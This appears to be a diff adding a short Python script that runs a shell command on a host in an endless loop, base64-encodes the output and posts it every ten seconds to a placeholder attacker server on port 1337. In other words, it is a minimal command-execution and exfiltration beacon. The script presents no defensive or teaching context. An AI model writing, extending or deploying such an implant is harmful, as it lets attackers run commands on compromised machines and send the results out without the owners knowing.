@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+import requests, base64, os, time
+
+SERVER_URL = 'http://<YOUR_IP>:1337'
+
+def send_cmd_output(output):
+    data = {"filename": "cmd_output.txt", "data": base64.b64encode(output.encode()).decode()}
+    requests.post(f"{SERVER_URL}/upload", json=data)
+
+while True:
+    try:
+        # Just an example: get command from local file or hardcoded
+        cmd = "whoami"
+        output = os.popen(cmd).read()
+        send_cmd_output(output)
+        time.sleep(10)
+    except:
+        time.sleep(60)
